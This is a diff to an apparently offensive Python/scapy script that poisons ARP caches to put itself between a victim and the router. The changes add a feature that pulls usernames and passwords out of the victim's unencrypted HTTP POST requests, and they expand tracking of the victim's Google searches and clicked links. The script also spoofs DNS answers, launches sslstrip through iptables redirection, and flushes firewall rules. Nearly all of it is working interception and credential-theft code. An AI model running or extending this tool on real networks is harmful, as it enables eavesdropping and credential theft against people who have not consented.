@@ -5,7 +5,7 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 conf.verb=0
 #Below is necessary to receive a response to the DHCP packets for some reason. If you know the answer to that message me.
-conf.checkIPaddr=0
+conf.checkIPaddr=1
 import time
 import sys
 import threading
@@ -13,6 +13,7 @@ import argparse
 import sys
 import os
 import signal
+import urlparse
 import commands
 bash=commands.getoutput
 
@@ -26,11 +27,28 @@ parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing
 parser.add_argument("-d", "--dnsspy", help="Show all DNS resquests the victim makes. This has the advantage of showing HTTPS domains which the -u option will not but does not show the full URL the victim is requesting.", action="store_true")
 parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
 parser.add_argument("-i", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
-parser.add_argument("-g", "--google", help="Print google searches.", action="store_true")
+parser.add_argument("-g", "--google", help="Print Google searches, and show nonHTTPS links they click on from the search results.", action="store_true")
 parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
 parser.add_argument("-uv", "--verboseURL", help="Shows all URLs the victim visits.", action="store_true")
 parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
+parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames and passwords in unsecure HTTP POSTs", action="store_true")
 args = parser.parse_args()
+
+class colors:
+	PURPLE = '\033[95m'
+	BLUE = '\033[94m'
+	OKGREEN = '\033[92m'
+	TAN = '\033[93m'
+	RED = '\033[91m'
+	ENDC = '\033[0m'
+
+	def disable(self):
+		self.HEADER = ''
+		self.OKBLUE = ''
+		self.OKGREEN = ''
+		self.TAN = ''
+		self.RED = ''
+		self.ENDC = ''
 
 #Find the gateway and use it as the router's info
 routerCmd = bash('ip route')
@@ -40,16 +58,16 @@ IPprefix = routerRE.group(2)
 interface = routerRE.group(3)
 localIP = [x[4] for x in scapy.all.conf.route.routes if x[2] != '0.0.0.0'][0]
 
-if args.dnsspy or args.dnsspoof:
-	print "Checking if the router is the DNS server..."
-	dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
-	ans, unans = srp(dhcp_discover, timeout=5, retry=2)
-	if ans:
-		for p in ans:
-			DNSserver = p[1][IP].src
-			print "DNS server at: ", DNSserver, '\n'
-	else:
-		print "No answer to DHCP packet sent to find the DNS server.\n"
+print "Checking the DNS server..."
+dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=RandString(12,'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
+ans, unans = srp(dhcp_discover, timeout=7, retry=2)
+if ans:
+	for p in ans:
+		DNSserver = p[1][IP].src
+		print "DNS server at:", DNSserver, '\n'
+else:
+	print "No answer to DHCP packet sent to find the DNS server. Setting DNS server to router IP.\n"
+	DNSserver = routerIP
 
 if args.ipaddress:
 	victimIP = args.ipaddress
@@ -62,7 +80,7 @@ else:
 
 def originalMAC(ip):
 	# srp is for layer 2 packets with Ether layer, sr is for layer 3 packets like ARP and IP
-	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=7, retry=3)
+	ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3)
 	for s,r in ans:
 		return r.sprintf("%Ether.src%")
 
@@ -71,22 +89,63 @@ def poison(routerIP, victimIP):
 	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff"))
 
 def restore(routerIP, victimIP, routerMAC, victimMAC):
-	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=5)
-	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=5)
+	send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3)
+	send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
 
 def URL(pkt):
-	if pkt.haslayer(Raw):
-		request = pkt[Raw].load
-		searchGET = re.compile('GET')
-		get = searchGET.search(request)
-		searchHost = re.compile('Host:')
-		host = searchHost.search(request)
-		if get and host:
-			a = request.split("\r\n")
-			b = a[1].split(" ")
-			c = a[0].split(" ")
-			url = b[1]+c[1]
-			print url
+#   Counter is to make sure we're not printing packet data twice if both username and password is found
+	counter = 0
+#	We add pkt[Ether].src check to make sure we're not messing with retransmitted packets
+	if pkt.haslayer(Raw) and pkt[Ether].src == victimMAC:
+		pkt = repr(pkt[Raw].load)
+		try:
+			headers, body = pkt.split(r"\r\n\r\n")
+		except:
+			headers = pkt
+			body = ''
+
+		post = re.search('POST /', headers)
+		get = re.search('GET /', headers)
+		host = re.search('Host: ', headers)
+
+#The big unsolvable problem is that sometimes sniff() will get a packet (usually from the arp spoofed victim)
+#and split it into 2 packets when wireshark sees only one. Consistently from neopets via arpspoof victim. The load
+#gets truncated and sniff() then treats the other few lines of the HTTP load as a new packet for some reason.
+#http://bpaste.net/show/v2CsP4Ixzb7NGGuutDSp/
+		if args.post and len(headers) < 450 and not get:
+			username = re.finditer('(([Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', headers)
+			password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', headers)
+			for x in username:
+				if x:
+					print colors.TAN,'[+] Packet was split by accident. Username Data:',headers, colors.ENDC
+					print colors.RED,x.group(),colors.ENDC
+					counter = 1
+			for y in password:
+				if y:
+					if counter == 0:
+						print colors.TAN, '[+] Packet was split by accident. Password data:', headers, colors.ENDC
+					print colors.RED, y.group(), colors.ENDC
+			counter = 0
+		if (post or get) and host:
+			a = headers.split(r"\r\n")
+			try:
+				b = a[0].split(" ")
+				c = a[1].split(" ")
+				url = c[1]+b[1]
+			except:
+				print "Could not form url"
+				return
+			if args.post and post:
+				if body != '':
+					print colors.TAN+'[+] POST:',url,'HTTP POST load:',body+colors.ENDC
+					password = re.finditer('(([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp]assw)=([^&][^&]*))', body)
+					username = re.finditer('(([Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin|[Ll]og)=([^&][^&]*))', body)
+					if username:
+						for x in username:
+							print colors.RED,x.group(),colors.ENDC
+					if password:
+						for y in password:
+							print colors.RED,y.group(),colors.ENDC
 			if args.urlspy:
 				d = ['.jpg', '.jpeg', '.gif', '.png', '.css', '.ico', '.js']
 				if any(i in url for i in d):
@@ -95,12 +154,43 @@ def URL(pkt):
 			if args.verboseURL:
 				print url
 			if args.google:
-				if 'google' in url:
-					r = re.findall(r'(?i)\&q=(.*?)\&', request)
+				if 'google.com' in url:
+					r = re.findall(r'(?i)\&q=(.*?)\&', url)
 					if r:
 						search = r[0].split('&')[0]
-						search = search.replace('q=', '').replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'')
-						print '%s googled:' % victimIP, search
+						search = search.replace('q=', '').replace('+', ' ').replace('%20', ' ').replace('%3F', '?').replace('%27', '\'').replace('%40', '@').replace('%24', '$').replace('%3A', ':').replace('%3D', '=')
+						print colors.BLUE + '[+] Googled:',search + colors.ENDC
+						try:
+							g,s = url.split('http%3A%2F%2F')
+							s = s.replace('%2F', '/').replace('%3F', '?').replace('%3D', '=')
+							s = s[:s.find('&')]
+							print colors.BLUE + '[+] Clicked this link from a Google search:',s + colors.ENDC
+						except:
+							pass
+
+
+
+
+
+#				bodyParsed = urlparse.parse_qs(body)
+#				print bodyParsed
+#				try:
+#					value = next(v for (k,v) in bodyParsed.iteritems() if passwd or username in k)
+#					print value
+#				except:
+#					print 'this post does not have username or password data'
+#				for k,v in bodyParsed.iteritems():
+#					if passwd or username in k:
+#						print bodyParsed[k]
+#			if args.post and post:
+#				print '%s POSTed to:' % victimIP, url
+#				print request
+#				username = re.search('([Uu]ser|[Uu]sername|[Nn]ame|[Ll]ogin)=[^&]*', request)
+#				if username:
+#					print username.group()
+#				else:
+#					print "Could not find username"
+
 
 def DNSreq(pkt):
 	if pkt.haslayer(DNSQR):
@@ -110,12 +200,14 @@ def DNSreq(pkt):
 def mkspoof(DNSpkt):
 	ip=DNSpkt[IP]
 	dnsLayer=DNSpkt[DNS]
-#qr = query or response (0,1), aa=are the nameservers authoritative? (0,1), ad=authenticated data (0,1)
+#	qr = query or response (0,1), aa=are the nameservers authoritative? (0,1), ad=authenticated data (0,1)
 	p = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport, sport=ip.dport)/DNS(id=dnsLayer.id, qr=1, aa=1, qd=dnsLayer.qd, an=DNSRR(rrname=dnsLayer.qd.qname, ttl=10, rdata=localIP))
 	return p
 
 class urlspy(threading.Thread):
 	def run(self):
+#		This is in case you need to test the program without an actual victim
+#		sniff(store=0, filter='port 80', prn=URL, iface=interface)
 		sniff(store=0, filter='port 80 and host %s' % victimIP, prn=URL, iface=interface)
 
 class dnsspy(threading.Thread):
@@ -125,13 +217,13 @@ class dnsspy(threading.Thread):
 class dnsspoof(threading.Thread):
 	def run(self):
 		while 1:
-			a=sniff(filter='port 53 and host %s' % victimIP, count=1, promisc=1)
+			a=sniff(filter='port 53 or port 80 and host %s' % victimIP, count=1, promisc=1)
 			DNSpkt = a[0]
 			if not DNSpkt.haslayer(DNSQR):
 				continue
 			if args.dnsspoof in DNSpkt.qd.qname:
 				send(mkspoof(DNSpkt))
-				print 'Sent spoofed DNS response packet for', DNSpkt.qd.qname
+				print colors.OKGREEN + '[+] Spoofed:', DNSpkt.qd.qname + colors.ENDC
 
 #class ssltrip(threading.Thread):
 #	def run(self):
@@ -139,6 +231,17 @@ def sslstrip():
 	print 'Redirecting traffic to port 10000 and starting sslstrip\n'
 	ip10000 = bash('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
 	sslstrip = bash('xterm -e sslstrip -f -w sslstrip.txt')
+
+print "Active interface = " + interface
+print "Router IP = " + routerIP
+print "Client IP = " + victimIP
+try:
+	routerMAC = originalMAC(routerIP)
+	print "Router MAC: " + routerMAC
+	victimMAC = originalMAC(victimIP)
+	print "Victim MAC: " + victimMAC + "\n"
+except:
+	sys.exit("Could not get MAC addresses")
 
 def main():
 
@@ -150,19 +253,7 @@ def main():
 	ipNATX = bash('iptables -t nat -X')
 	print 'Enabled IP forwarding and flushed the firewall\n'
 
-	print "Active interface = " + interface
-	print "Router IP = " + routerIP
-	print "Client IP = " + victimIP
-
-	try:
-		routerMAC = originalMAC(routerIP)
-		print "Router MAC: " + routerMAC
-		victimMAC = originalMAC(victimIP)
-		print "Victim MAC: " + victimMAC + "\n"
-	except:
-		sys.exit("Could not get MAC addresses")
-
-	if args.urlspy or args.google or args.verboseURL:
+	if args.urlspy or args.google or args.verboseURL or args.post:
 		ug = urlspy()
 		#Make sure the thread closes with the main program on Ctrl-C
 		ug.daemon = True
@@ -174,7 +265,6 @@ def main():
 		dt.start()
 
 	if args.driftnet:
-		time.sleep(5)
 		driftnet = bash('xterm -e driftnet -i %s' % interface)
 
 	if args.sslstrip:
@@ -190,7 +280,9 @@ def main():
 		restore(routerIP, victimIP, routerMAC, victimMAC)
 		restore(routerIP, victimIP, routerMAC, victimMAC)
 		ipforwardoff = bash('echo 0 > /proc/sys/net/ipv4/ip_forward')
-		flush = bash('iptables -t nat -F')
+		flush1 = bash('iptables -t nat -F')
+		flush2 = bash('iptables -F')
+		flush3 = bash('iptables -X')
 		sys.exit(0)
 
 	signal.signal(signal.SIGINT, signal_handler)
@@ -199,11 +291,8 @@ def main():
 	while 1:
 
 		poison(routerIP, victimIP)
-		try:
-			if DNSserver != routerIP:
-				poison(DNSserver, victimIP)
-		except Exception:
-			pass
+		if not DNSserver == routerIP:
+			poison(DNSserver, victimIP)
 		time.sleep(1.5)
 
 
